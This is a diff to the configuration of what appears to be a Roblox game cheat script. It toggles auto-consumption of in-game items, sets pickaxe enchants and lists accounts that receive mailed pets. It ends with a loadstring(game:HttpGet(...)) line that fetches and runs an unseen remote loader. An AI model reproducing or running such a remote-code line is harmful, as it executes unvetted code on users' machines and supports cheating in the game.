@@ -2,8 +2,9 @@ getgenv().petsGoConfig = {
     -- Event config
     -- true will open event gift bag/egg
     -- false will auto mail gift bag/egg
-    CONSUME_ALL_MINING_CHEST = false,
-    CONSUME_CORRUPTED_HUGE_BAIT = false,
+    CONSUME_CORRUPTED_HUGE_BAIT = true,
+    CONSUME_ALL_ENCHANT_SAFE = true,
+    CONSUME_ALL_MINING_CHEST = true,
     CONSUME_EVENT_GIFT_BAG = false,
     CONSUME_EVENT_EGG = false, -- Hype eggs not included
 
@@ -14,11 +15,14 @@ getgenv().petsGoConfig = {
 
     DIAMOND_EGG = true,  -- true = Diamond Egg, false = F2P Egg
     
+    -- Allowed enchant keywords : Criticals, Loot, Speed, Strength, Chests, Diamonds, Huges, Lightning, TNT
+    PICKAXE_ENCHANTS = {"Strength", "Criticals"},
+    
     MAILING = true,  -- Auto mail
     MAIL_FISHING_ROD = false,  -- true = mail, false = keep fishing rod on account (FASTER Fishing)
     MAIL_WEBHOOK_ODDS = 100000000, -- Minimum Pet Odds To Trigger MAIL Webhook
     MAIL_PET_ODDS = 300000000,  -- Minimum Pet Odds To Mail
-    USERNAME_TO_MAIL = {"BoydCurtis17", "SalazarMelvin282"} -- Mail to username, Example : USERNAME_TO_MAIL = {"username1", "username2}
+    USERNAME_TO_MAIL = {"BoydCurtis17", "SalazarMelvin282"} -- Mail to username, Example : USERNAME_TO_MAIL = {"username1", "username2"}
 }
 
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
